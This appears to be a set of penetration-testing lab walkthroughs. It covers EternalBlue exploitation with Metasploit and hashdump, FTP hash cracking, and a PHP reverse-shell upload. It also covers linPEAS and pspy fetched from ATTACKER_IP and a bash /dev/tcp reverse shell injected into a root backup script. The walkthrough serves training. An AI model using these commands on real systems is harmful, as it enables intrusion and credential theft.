## Sources
https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1

## Blue – Exploiting Windows 7 (EternalBlue)

Target: Windows 7 vulnerable to MS17-010 (EternalBlue), SMB service exposed.

### Metasploit EternalBlue exploitation

Basic flow:

1. Start Metasploit and find EternalBlue modules:
   ```bash
   msfconsole
   search eternalblue
   ```
   Typically you select:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```

2. Set options:
   ```bash
   set RHOSTS <target-ip>
   set LHOST <your-interface-or-ip>   # e.g. eth0
   set LPORT 4444
   set payload windows/x64/meterpreter/reverse_tcp
   ```
   `LHOST` is the attacker IP/interface that will receive the reverse Meterpreter connection.

3. Run the exploit:
   ```bash
   exploit
   ```
   If successful, a Meterpreter session opens with NT AUTHORITY\SYSTEM or another high-privileged context.

### Dumping password hashes with Meterpreter

Once inside Meterpreter:

- Use:
  ```bash
  hashdump
  ```
  This reads credential hashes from SAM/LSASS in memory, similar to classical pwdump tools, but without dropping extra files to disk.

- The dumped hashes can then be cracked offline with tools like Hashcat or John the Ripper and reused for lateral movement or persistence.

Key idea: EternalBlue gives remote code execution; `hashdump` turns that into credential access for further compromise.

***

## Academy – FTP, Web, and Privilege Escalation

Target: Linux host with FTP (vsftpd) on port 21 and a PHP web application under `/academy`.

### 1. FTP enumeration and hash cracking

1. Discover open FTP and anonymous login:
   - Service: `vsftpd` on port 21.
   - Connect:
     ```bash
     ftp 192.168.138.169
     # username: anonymous
     # password: <anything>
     ```
     Anonymous login is accepted.

2. Download exposed file:
   ```bash
   get note.txt
   ```
   This note may contain a hash or other sensitive information such as credentials.

3. Identify the hash:
   - Use `hash-identifier` on Kali to guess the hash type; in this lab it is detected as MD5.

4. Brute force with Hashcat:
   ```bash
   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
   ```
   - `-m 0` = MD5 mode.
   - `hashes.txt` contains the MD5 hash.
   - `rockyou.txt` is a common password wordlist.

Result: you obtain a cleartext password that will later be reused on another service (credential reuse).

***

### 2. Web enumeration and authentication

1. Basic directory brute force:

   Using `dirb`:
   ```bash
   dirb http://192.168.138.169
   ```

   Using `ffuf`:
   ```bash
   ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
        -u http://192.168.138.169/FUZZ
   ```
   This fuzzes for common directories like `/academy`, `/admin`, and others.

2. Access the discovered `/academy` directory:
   - URL: `http://192.168.138.169/academy`
   - Log in using the cleartext credentials recovered from the MD5 crack (username and password).

Now you have authenticated access to the web application, which uses PHP for profile management.

***

### 3. Web shell upload and reverse shell

1. Identify upload functionality:
   - In profile settings, there is an option to upload a profile picture.
   - After upload, click “view” to see the image path (for example `/academy/uploads/yourfile.php`). This confirms where uploaded files are stored and that PHP may be executed there.

2. Prepare a PHP reverse shell:
   - Use a standard PHP reverse shell script (for example the classic `php-reverse-shell.php` from pentestMonkey).
   - Edit it to set:
     - `$ip` to the attacker IP (`ATTACKER_IP`).
     - `$port` to the chosen listening port (for example `1234`).

3. Start a listener on the attacker machine:
   ```bash
   nc -nvlp 1234
   ```

4. Upload the modified PHP reverse shell as the “picture”:
   - If the application does not properly validate file extensions or MIME type, the file will be placed in the webroot and interpreted as PHP.

5. Trigger the shell:
   - Browse directly to the uploaded file URL (from the “view” link).
   - The Netcat listener receives a reverse connection, giving a shell as `www-data` (web server user).

At this point the goal is to escalate from low-privileged `www-data` to a higher-privileged user.

***

### 4. Privilege escalation with linPEAS

1. Host a simple HTTP server on the attacker:
   ```bash
   cd /path/where/linpeas.sh/is
   python3 -m http.server 80
   ```

2. On the reverse shell (target):
   ```bash
   cd /tmp
   wget http://ATTACKER_IP/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```
   LinPEAS enumerates the Linux system and highlights potential privilege escalation vectors: interesting files, credentials in configs, SUID binaries, cron jobs, sudo misconfigurations, kernel exploits, and more.

3. Typical findings in this lab:
   - Credentials stored in a web config:
     ```text
     /var/www/html/academy/includes/config.php
     ```
     This usually contains database username and password that may be reused as a system password.

   - Users list:
     ```bash
     cat /etc/passwd
     ```
     You notice a user account named `grimmie`.

4. Try SSH with discovered credentials:
   ```bash
   ssh grimmie@192.168.138.169
   # password: database password from config.php
   ```
   If login succeeds, you now have an interactive shell as `grimmie`, which is more privileged than `www-data`.

***

### 5. Monitoring scheduled tasks with pspy and abusing backup.sh

1. Investigate scheduled jobs:
   - List systemd timers:
     ```bash
     systemctl list-timers
     ```
     This shows timers that may be launching scripts such as `backup.sh`.

2. Download and run pspy:

   On the attacker:
   ```bash
   # place pspy64 in the HTTP server directory
   python3 -m http.server 80
   ```

   On the target:
   ```bash
   cd /tmp
   wget http://ATTACKER_IP/pspy64
   chmod +x pspy64
   ./pspy64
   ```
   pspy monitors running processes and reveals what commands and cron jobs are executed in real time, without requiring root.

3. Observe `backup.sh` execution:
   - In pspy output you see something like:
     ```text
     /usr/local/bin/backup.sh
     ```
     running periodically, likely as root or another privileged user.

4. Abuse a writable backup script:
   - If `backup.sh` is writable by your current user (`grimmie`), edit it and add a reverse shell one-liner.
   - Example pattern:
     ```bash
     bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
     ```

   - On the attacker:
     ```bash
     nc -nvlp 4444
     ```

   - Wait for the next scheduled execution of `backup.sh`. When it runs with higher privileges, it executes your injected reverse shell and connects back to your listener as that privileged user.

Result: privilege escalation via a misconfigured, writable scheduled backup script.
